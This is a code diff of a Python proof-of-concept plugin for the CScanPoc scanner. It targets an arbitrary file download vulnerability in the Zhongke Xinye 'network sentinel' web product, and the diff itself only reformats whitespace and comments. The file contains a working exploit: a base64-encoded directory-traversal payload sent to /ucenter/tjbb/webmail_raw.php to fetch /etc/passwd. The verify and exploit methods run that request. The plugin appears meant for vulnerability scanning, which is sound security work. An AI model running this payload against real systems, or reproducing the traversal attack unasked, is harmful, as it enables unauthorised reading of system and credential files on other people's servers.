@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Seentech_0003' # 平台漏洞编号，留空
+    vuln_id = 'Seentech_0003'  # 平台漏洞编号，留空
     name = '中科新业网络哨兵 任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2015-07-17'  # 漏洞公布时间
     desc = '''
         中科新业网络哨兵 /ucenter/tjbb/webmail_raw.php 任意文件可下载。
@@ -31,8 +32,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0126977
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0126977
             payload = "/ucenter/tjbb/webmail_raw.php?path=Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA=="
             verify_url = self.target + payload
             r = requests.get(verify_url)
@@ -46,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
